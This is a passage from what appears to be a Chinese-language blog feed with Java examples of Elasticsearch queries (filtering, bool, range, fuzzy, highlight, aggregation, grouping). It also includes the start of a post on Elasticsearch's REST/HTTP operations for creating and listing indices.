&#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤字段查询"><a href="#过滤字段查询" class="headerlink" title="过滤字段查询"></a>过滤字段查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 过滤字段查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        String[] excludes = &#123;<span class="string">&quot;sex&quot;</span>&#125;;</span><br><span class="line">        String[] includes = &#123;&#125;;</span><br><span class="line">        sourceBuilder.fetchSource(includes, excludes);</span><br><span class="line"></span><br><span class="line">        sourceBuilder.query(QueryBuilders.matchAllQuery());</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="组合查询"><a href="#组合查询" class="headerlink" title="组合查询"></a>组合查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CombineQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 组合查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        <span class="type">BoolQueryBuilder</span> <span class="variable">boolQueryBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BoolQueryBuilder</span>();</span><br><span class="line">        <span class="comment">//必须包含</span></span><br><span class="line">        boolQueryBuilder.must(QueryBuilders.matchQuery(<span class="string">&quot;age&quot;</span>,<span class="number">30</span>));</span><br><span class="line">        <span class="comment">// 一定不含</span></span><br><span class="line">        boolQueryBuilder.mustNot(QueryBuilders.matchQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhangsan&quot;</span>));</span><br><span class="line">        <span class="comment">// 可能包含</span></span><br><span class="line">        boolQueryBuilder.should(QueryBuilders.matchQuery(<span class="string">&quot;sex&quot;</span>, <span class="string">&quot;男&quot;</span>));</span><br><span class="line"></span><br><span class="line">        sourceBuilder.query(boolQueryBuilder);</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RangeQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 范围查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        <span class="type">RangeQueryBuilder</span> <span class="variable">rangeQuery</span> <span class="operator">=</span> QueryBuilders.rangeQuery(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="comment">// 大于等于</span></span><br><span class="line">        rangeQuery.gte(<span class="string">&quot;20&quot;</span>);</span><br><span class="line">        <span class="comment">// 小于等于</span></span><br><span class="line">        rangeQuery.lte(<span class="string">&quot;40&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sourceBuilder.query(rangeQuery);</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FuzzyQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 模糊查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        sourceBuilder.query(QueryBuilders.fuzzyQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;zhangsan&quot;</span>).fuzziness(Fuzziness.ONE));</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            <span class="comment">//输出每条查询的结果信息</span></span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="高亮查询"><a href="#高亮查询" class="headerlink" title="高亮查询"></a>高亮查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HighLightQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 高亮查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        <span class="type">TermQueryBuilder</span> <span class="variable">termQueryBuilder</span> <span class="operator">=</span> QueryBuilders.termQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">        sourceBuilder.query(termQueryBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构建高亮字段</span></span><br><span class="line">        <span class="type">HighlightBuilder</span> <span class="variable">highlightBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HighlightBuilder</span>();</span><br><span class="line">        highlightBuilder.preTags(<span class="string">&quot;&lt;font color=&#x27;red&#x27;&gt;&quot;</span>);<span class="comment">//设置标签前缀</span></span><br><span class="line">        highlightBuilder.postTags(<span class="string">&quot;&lt;/font&gt;&quot;</span>);<span class="comment">//设置标签后缀</span></span><br><span class="line">        highlightBuilder.field(<span class="string">&quot;name&quot;</span>);<span class="comment">//设置高亮字段</span></span><br><span class="line">        sourceBuilder.highlighter(highlightBuilder);</span><br><span class="line"></span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 查询匹配</span></span><br><span class="line">        <span class="type">SearchHits</span> <span class="variable">hits</span> <span class="operator">=</span> response.getHits();</span><br><span class="line">        System.out.println(<span class="string">&quot;took:&quot;</span> + response.getTook());</span><br><span class="line">        System.out.println(<span class="string">&quot;timeout:&quot;</span> + response.isTimedOut());</span><br><span class="line">        System.out.println(<span class="string">&quot;total:&quot;</span> + hits.getTotalHits());</span><br><span class="line">        System.out.println(<span class="string">&quot;MaxScore:&quot;</span> + hits.getMaxScore());</span><br><span class="line">        System.out.println(<span class="string">&quot;hits========&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (SearchHit hit : hits) &#123;</span><br><span class="line">            System.out.println(hit.getSourceAsString());</span><br><span class="line">            <span class="comment">//打印高亮结果</span></span><br><span class="line">            Map&lt;String, HighlightField&gt; highlightFields = hit.getHighlightFields();</span><br><span class="line">            System.out.println(highlightFields);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;&lt;&lt;========&quot;</span>);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AggregationQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 高亮查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        <span class="type">MaxAggregationBuilder</span> <span class="variable">aggregationBuilder</span> <span class="operator">=</span> AggregationBuilders.max(<span class="string">&quot;max_age&quot;</span>).field(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sourceBuilder.aggregation(aggregationBuilder);</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印响应结果</span></span><br><span class="line">        System.out.println(response);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroupQuery</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">RestHighLevelClient</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestHighLevelClient</span>(</span><br><span class="line">                RestClient.builder(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>, <span class="string">&quot;http&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchRequest</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchRequest</span>(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="comment">// 高亮查询</span></span><br><span class="line">        <span class="type">SearchSourceBuilder</span> <span class="variable">sourceBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchSourceBuilder</span>();</span><br><span class="line">        <span class="type">TermsAggregationBuilder</span> <span class="variable">termsAggregationBuilder</span> <span class="operator">=</span> AggregationBuilders.terms(<span class="string">&quot;age_groupby&quot;</span>).field(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"></span><br><span class="line">        sourceBuilder.aggregation(termsAggregationBuilder);</span><br><span class="line">        request.source(sourceBuilder);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchResponse</span> <span class="variable">response</span> <span class="operator">=</span> client.search(request, RequestOptions.DEFAULT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印响应结果</span></span><br><span class="line">        System.out.println(response);</span><br><span class="line">        client.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch的HTTP操作</title>
      <link href="/posts/6184/"/>
      <url>/posts/6184/</url>
      
        <content type="html"><![CDATA[<h1 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h1><p>​        REST 指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 RESTful。Web 应用程序最重要的 REST 原则是，客户端和服务器之间的交互在请求之间是无状态的。从客户端到服务器的每个请求都必须包含理解请求所必需的信息。如果服务器在请求之间的任何时间点重启，客户端不会得到通知。此外，无状态请求可以由任何可用服务器回答，这十分适合云计算之类的环境。客户端可以缓存数据以改进性能。</p><p>​        在服务器端，应用程序状态和功能可以分为各种资源。资源是一个有趣的概念实体，它向客户端公开。资源的例子有：应用程序对象、数据库记录、算法等等。每个资源都使用 URI (Universal Resource Identifier) 得到一个唯一的地址。所有资源都共享统一的接口，以便在客户端和服务器之间传输状态。使用的是标准的 HTTP 方法，比如 GET、PUT、POST 和DELETE。 </p><p>​        在 REST 样式的 Web 服务中，每个资源都有一个地址。资源本身都是方法调用的目标，方法列表对所有资源都是一样的。这些方法都是标准方法，包括 HTTP GET、POST、PUT、DELETE，还可能包括 HEAD 和 OPTIONS。简单的理解就是，如果想要访问互联网上的资源，就必须向资源所在的服务器发出请求，请求体中必须包含资源的网络路径，以及对资源进行的操作(增删改查)。</p><hr><h1 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h1><p>Elasticsearch 是面向文档型数据库，一条数据在这里就是一个文档。为了方便理解，我们将 Elasticsearch 里存储文档数据和关系型数据库 MySQL 存储数据的概念进行一个类比：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211101234242.png"></p><p>ES 里的 Index 可以看做一个库，而 Types 相当于表，Documents 则相当于表的行。这里 Types 的概念已经被逐渐弱化，Elasticsearch 6.X 中，一个 index 下已经只能包含一个type，Elasticsearch 7.X 中, Type 的概念已经被删除了。</p><h1 id="索引操作"><a href="#索引操作" class="headerlink" title="索引操作"></a>索引操作</h1><h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><p>对比关系型数据库，创建索引就等同于创建数据库</p><p>在 Postman 中，向 ES 服务器发 <strong>PUT</strong> 请求 ：<a href="http://127.0.0.1:9200/shopping">http://127.0.0.1:9200/shopping</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211103233844.png"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;acknowledged&quot;</span><span class="string">【响应结果】:</span> <span class="literal">true</span>, <span class="comment"># true 操作成功</span></span><br><span class="line"> <span class="string">&quot;shards_acknowledged&quot;</span><span class="string">【分片结果】:</span> <span class="literal">true</span>, <span class="comment"># 分片操作成功</span></span><br><span class="line"> <span class="string">&quot;index&quot;</span><span class="string">【索引名称】:</span> <span class="string">&quot;shopping&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 注意：创建索引库的分片数默认 1 片，在 7.0.0 之前的 Elasticsearch 版本中，默认 5 片</span></span><br></pre></td></tr></table></figure><p>如果重复添加索引，会返回错误信息：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211103233946.png"></p><hr><h2 id="查看所有索引"><a href="#查看所有索引" class="headerlink" title="查看所有索引"></a>查看所有索引</h2><p>在 Postman 中，向 ES 服务器发 <strong>GET</strong> 请求 ：<a href="http://127.0.0.1:9200/_cat/indices?v">http://127.0.0.1:9200/_cat/indices?v</a></p><p>这里请求路径中的_cat 表示查看的意思，indices 表示索引，所以整体含义就是查看当前 ES服务器中的所有索引，就好像 MySQL 中的 show tables 的感觉，服务器响应结果如下：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20211103234806.png"></p><table><thead><tr><th>表头</th><th>含义</th></tr></thead><tbody><tr><td>health</td><td>当前服务器健康状态：green(集群完整) 